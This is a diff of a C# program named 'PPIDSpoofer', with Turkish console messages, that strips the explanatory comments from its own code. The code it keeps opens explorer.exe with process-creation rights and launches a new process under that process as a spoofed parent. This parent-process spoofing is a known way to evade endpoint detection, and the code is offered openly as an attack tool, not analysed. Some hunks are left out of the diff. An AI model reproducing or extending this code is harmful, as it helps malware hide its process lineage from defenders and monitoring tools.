@@ -4,7 +4,6 @@ using System.Runtime.InteropServices;
 
 class PPIDSpoofer
 {
-    // Windows API P/Invoke tanimlamalari
     [DllImport("kernel32.dll")]
     static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
@@ -41,7 +40,6 @@ class PPIDSpoofer
     {
         Console.WriteLine("[*] PPID Spoofing Operasyonu Basliyor...");
 
-        // 1. Hedef Babayi Bul (Masaustunu yoneten Explorer.exe)
         Process[] procs = Process.GetProcessesByName("explorer");
         if (procs.Length == 0) {
             Console.WriteLine("[!] Explorer bulunamadi amk."); return;
@@ -49,22 +47,18 @@ class PPIDSpoofer
         int parentPid = procs[0].Id;
         Console.WriteLine("[+] Kurban Baba (Explorer) PID: " + parentPid);
 
-        // 2. Babaya PROCESS_CREATE_PROCESS (0x0080) yetkisiyle baglan!
         IntPtr hParent = OpenProcess(0x0080, false, parentPid);
         if (hParent == IntPtr.Zero) {
             Console.WriteLine("[!] Babaya erisemedik. Yetki yok!"); return;
         }
 
-        // 3. Sahtekarlik icin Attribute Listesini ayarla (0x00020000 = PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
         IntPtr lpSize = IntPtr.Zero;
         InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
         IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
         InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);
 
-        // Pointer karmasasini sildik, direkt hParent'i ref olarak basiyoruz!
         UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020000, ref hParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
 
-        // 4. Yeni sureci sahte baba ile baslat (0x00080000 = EXTENDED_STARTUPINFO_PRESENT)
         STARTUPINFOEX siex = new STARTUPINFOEX();
         siex.StartupInfo.cb = Marshal.SizeOf(siex);
         siex.lpAttributeList = lpAttributeList;
@@ -80,4 +74,4 @@ class PPIDSpoofer
             Console.WriteLine("[!] Hata ulan: " + Marshal.GetLastWin32Error());
         }
     }
-} // Iste o unuttugun sihirli parantez burada!
+} 
